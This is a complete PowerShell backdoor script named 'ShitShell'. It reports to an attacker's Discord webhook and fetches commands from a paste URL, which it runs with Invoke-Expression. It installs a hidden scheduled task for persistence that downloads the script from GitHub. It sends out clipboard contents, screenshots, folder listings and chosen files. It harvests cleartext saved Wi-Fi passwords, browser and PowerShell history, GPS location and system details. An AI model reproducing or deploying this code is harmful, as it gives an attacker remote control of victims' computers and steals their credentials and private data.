Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing

$hookUrl = "$hk"
$bin = "$bn"

#Welcome message
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
$jsonPayload = @{
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | ShitShell session started!"
            description = "``The worst Reverse Shell out there!" +
                          "`nYou can use the following commands:``" +
                          "`n`n:arrow_forward: Close: Closes the current ShitShell session." +
                          "`n:arrow_forward: FolderTree: Gets folder trees and sends it to your Webhook." +
                          "`n:arrow_forward: CheckForAdmin: Checks if the script is being run as admin." +
                          "`n:arrow_forward: AddPersistance: Runs script on startup." +
                          "`n:arrow_forward: RemovePersistance: Removes persistance. " +
                          "`n:arrow_forward: GetClipboard: Sends clipboard content to your webhook." +
                          "`n:arrow_forward: TakeScreenshot: Sends a screenshot to your webhook." +
                          "`n:arrow_forward: Exfil: Given a path, this function will exfiltrate data to your webhook."
            color       = 16711680
            author      = @{
                name     = "ShitShell"
            }
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}
$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'

Function FolderTree{
tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
$FilePath ="$env:temp/TreesOfKnowledge.zip"
Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
sleep 1
curl.exe -F file1=@"$FilePath" $hookurl | Out-Null
rm -Path $FilePath -Force
Write-Output "Done."
}

function Close {

    $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
    $jsonPayload = @{
        tts        = $false
        embeds     = @(
            @{
                title       = "$env:COMPUTERNAME | ShitShell session closed!"
                description = ":octagonal_sign:  The ShitShell session was closed! :octagonal_sign:"
                color       = 16711680
                author      = @{
                    name     = "ShitShell"
                }
                footer      = @{
                    text = "$timestamp"
                }
            }
        )
    }
    $jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'

    break
}


function CheckForAdmin {

    If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":x: ``Not an Admin!`` :x:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }else{
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":white_check_mark:  ``Its an Admin!`` :white_check_mark:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }
    
}


function AddPersistance {
    
    "`$hookurl = `"$hookurl`"" | Out-File "$env:TEMP\s.ps1" -Force
    "`$bin = `"$bin`"" | Out-File -Append "$env:TEMP\s.ps1" -Force
    (Invoke-WebRequest "https://raw.githubusercontent.com/Neo0412/FlipperScripts/main/ShitShell.ps1").Content | Out-File -Append "$env:TEMP\s.ps1"

    Start-Sleep 5

    (Get-Content -Path "$env:TEMP\s.ps1" | Where-Object {$_ -notlike '*$hookUrl = "$hk"*' -and $_ -notlike '*$bin = "$bn"*'}) | Set-Content -Path "$env:TEMP\s.ps1" -Force

    $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $TaskAction = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\s.ps1"
    Register-ScheduledTask "PSTask" -Action $TaskAction -Trigger $TaskTrigger -RunLevel Highest

    Start-Sleep 2

    if (!(Get-ScheduledTask -TaskName "PSTask" -ErrorAction SilentlyContinue)){
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":x: ``Something went wrong!`` :x:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }
    else {
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":white_check_mark:  ``Script now runs on startup!`` :white_check_mark:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }

}

function RemovePersistance {

    Get-ScheduledTask -TaskName "PSTask" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false

    Remove-Item "$env:TEMP\s.ps1" -Force

    if ((Get-ScheduledTask -TaskName "PSTask" -ErrorAction SilentlyContinue)){
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":x: ``Something went wrong!`` :x:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }
    else {
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":white_check_mark:  ``Removed persistance!`` :white_check_mark:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }

}

function GetClipboard {

    $ClipboardHistory = @()

    $ClipboardItem = [System.Windows.Forms.Clipboard]::GetDataObject()
    $Types = $ClipboardItem.GetFormats()

    Foreach ($Type in $Types) {

        switch ($Type) {

            Text { $ItemType = "Text" }
            FileDrop { $ItemType = "Data" }
        }
    }

    if ($ItemType -eq "Text") {
        $Content = $ClipboardItem.GetText()
    }
    elseif ($ItemType -eq "Data") {
        $DataPath = $ClipboardItem.GetFileDropList()
        $Content = Get-Item $DataPath
    }

    if (($Content.GetType()).Name -eq "String") {

        $Body = @{
            'username' = "$env:COMPUTERNAME"
            'content'  = ":clipboard:Text_From_Clipboard:" + "`n$Content"
        }
        
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json)

        $ClipboardHistory += $Content

    }
    else {
        curl.exe -F "file1=@$Content"  -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":clipboard:File_from_Clipboard:\"}"' $hookurl | Out-Null

        $ClipboardHistory += $Content.Name

    }
    
}


function TakeScreenshot {

    $Filett = "$env:temp\SC.png"
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@$filett" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":camera:Screenshot:\"}"' $hookurl | Out-Null
    Start-Sleep 1
    Remove-Item -Path $filett
 
}

function Exfil {
    param (
        $Path
    )

    $Data = Get-Item $Path
    $ExfilTemp = "$env:TEMP\temp.zip"

    if($Data -is [System.IO.DirectoryInfo]){

        Compress-Archive $Data -DestinationPath $ExfilTemp  -CompressionLevel Fastest
        curl.exe -F "file1=@$ExfilTemp" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":floppy_disk:ExfilData:\"}"' $hookurl | Out-Null
        Remove-Item $ExfilTemp -Force

    }else{

        curl.exe -F "file1=@$Data" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":floppy_disk:ExfilData:\"}"' $hookurl | Out-Null

    }
    
}


function SysInfo {

    
 if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}

    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

    Add-Type -AssemblyName System.Windows.Forms

    # WMI Classes
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $videocardinfo = Get-WmiObject Win32_VideoController
    $Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
    $processor = "$($processorInfo.Name)"
    $gpu = "$($videocardinfo.Name)"
    $DiskHealth = Get-PhysicalDisk | Select-Object DeviceID, FriendlyName, OperationalStatus, HealthStatus; $DiskHealth = ($DiskHealth | Out-String)
    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion

    # User Information
    $fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
    $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
    $OSString = "$($systemInfo.Caption)"
    $OSArch = "$($systemInfo.OSArchitecture)"
    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    $users = "$($userInfo.Name)"
    $userString = "`nFull Name : $($userInfo.FullName)"
    $clipboard = Get-Clipboard

    # System Information
    $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices| Out-String)
    $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process| Out-String)
    $service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}; $service = ($service | Out-String)
    $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software| Out-String)
    $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
    $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw ;$pshistory = ($pshistory | Out-String) 
    $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime;$RecentFiles = ($RecentFiles | Out-String)
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"

    # Nearby WiFi Networks
    $showNetworks = explorer.exe ms-availablenetworks:
    sleep 4

    $wshell = New-Object -ComObject wscript.shell
    $wshell.AppActivate('explorer.exe')
    $tab = 0
    while ($tab -lt 6){
    $wshell.SendKeys('{TAB}')
    $tab++
    }
    $wshell.SendKeys('{ENTER}')
    $wshell.SendKeys('{TAB}')
    $wshell.SendKeys('{ESC}')
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
    $Wifi = ($NearbyWifi|Out-String)

    # Current System Metrics
    function Get-PerformanceMetrics {
        $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
        $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
        $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
        $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue

        return [PSCustomObject]@{
            CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
            MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
            DiskIO = "{0:F2}" -f $diskIO.CookedValue
            NetworkIO = "{0:F2}" -f $networkIO.CookedValue
        }
    }
    $metrics = Get-PerformanceMetrics
    $PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
    $PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
    $PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
    $PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"

    # History and Bookmark Data
    $Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    $Paths = @{
        'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
        'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
        'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
        'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
        'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
        'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
        'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
    }
    $Browsers = @('chrome', 'edge', 'firefox', 'opera')
    $DataValues = @('history', 'bookmarks')
    $outpath = "$env:temp\Browsers.txt"
    foreach ($Browser in $Browsers) {
        foreach ($DataValue in $DataValues) {
            $PathKey = "${Browser}_${DataValue}"
            $Path = $Paths[$PathKey]

            $Value = Get-Content -Path $Path | Select-String -AllMatches $Expression | % {($_.Matches).Value} | Sort -Unique

            $Value | ForEach-Object {
                [PSCustomObject]@{
                    Browser  = $Browser
                    DataType = $DataValue
                    Content = $_
                }
            } | Out-File -FilePath $outpath -Append
        }
    }
    $Value = Get-Content -Path $outpath
    $Value = ($Value | Out-String)

    # Saved WiFi Network Info
    $outssid = ''
    $a=0
    $ws=(netsh wlan show profiles) -replace ".*:\s+"
    foreach($s in $ws){
        if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
            $ssid=$s.Trim()
            if($s -Match ":"){
                $ssid=$s.Split(":")[1].Trim()
                }
            $pw=(netsh wlan show profiles name=$ssid key=clear)
            $pass="None"
            foreach($p in $pw){
                if($p -Match "Key Content"){
                $pass=$p.Split(":")[1].Trim()
                $outssid+="SSID: $ssid | Password: $pass`n-----------------------`n"
                }
            }
        }
        $a++
    }

    # GPS Location Info
    Add-Type -AssemblyName System.Device
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $GeoWatcher.Start()
    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
        Sleep -M 100
    }  
    if ($GeoWatcher.Permission -eq 'Denied'){
        $GPS = "Location Services Off"
    }
    else{
        $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
        $GL = $GL -split " "
        $Lat = $GL[0].Substring(11) -replace ".$"
        $Lon = $GL[1].Substring(10) -replace ".$"
        $GPS = "LAT = $Lat LONG = $Lon"
    }


    $infomessage = "
    ==================================================================================================================================
        _________               __                           .__        _____                            __  .__               
        /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
        \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
        /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
        /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
                \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
    ==================================================================================================================================
    "

    $infomessage1 = "``````
    =============================================================
    SYSTEM INFORMATION FOR $env:COMPUTERNAME
    =============================================================
    User Information
    -------------------------------------------------------------
    Current User          : $env:USERNAME
    Email Address         : $email
    Language              : $systemLanguage
    Keyboard Layout       : $keyboardLayoutID
    Other Accounts        : $users
    Current OS            : $OSString
    Build ID              : $ver
    Architechture         : $OSArch
    Screen Size           : $screensize
    Location              : $GPS
    =============================================================
    Hardware Information
    -------------------------------------------------------------
    Processor             : $processor 
    Memory                : $RamInfo
    Gpu                   : $gpu

    Storage
    ----------------------------------------
    $Hddinfo
    $DiskHealth
    Current System Metrics
    ----------------------------------------
    $PMcpu
    $PMmu
    $PMdio
    $PMnio
    =============================================================
    Network Information
    -------------------------------------------------------------
    Public IP Address     : $computerPubIP
    ``````"
    $infomessage2 = "

    Saved WiFi Networks
    ----------------------------------------
    $outssid

    Nearby Wifi Networks
    ----------------------------------------
    $Wifi
    ==================================================================================================================================
    History Information
    ----------------------------------------------------------------------------------------------------------------------------------
    Clipboard Contents
    ---------------------------------------
    $clipboard

    Browser History
    ----------------------------------------
    $Value

    Powershell History
    ---------------------------------------
    $pshistory

    ==================================================================================================================================
    Recent File Changes Information
    ----------------------------------------------------------------------------------------------------------------------------------
    $RecentFiles

    ==================================================================================================================================
    USB Information
    ----------------------------------------------------------------------------------------------------------------------------------
    $usbdevices

    ==================================================================================================================================
    Software Information
    ----------------------------------------------------------------------------------------------------------------------------------
    $software

    ==================================================================================================================================
    Running Services Information
    ----------------------------------------------------------------------------------------------------------------------------------
    $service

    ==================================================================================================================================
    Current Processes Information
    ----------------------------------------------------------------------------------------------------------------------------------
    $process

    =================================================================================================================================="

    $outpath = "$env:TEMP/systeminfo.txt"
    $infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
    $infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
    $infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append

    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage1"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

    curl.exe -F file1=@"$outpath" $hookurl
    Sleep 1
    Remove-Item -Path $outpath -force
    Remove-Item -Path $outpath -force

}

##########################
$commands = @()
$previousBinText = ""

while ($true) {
    $PastBinText = (Invoke-WebRequest $bin).Content
    
    if ($PastBinText -eq $previousBinText) {
        Start-Sleep 10
    }
    else {
        Invoke-Expression $PastBinText
        $commands += $PastBinText
        $previousBinText = $PastBinText
    }
}

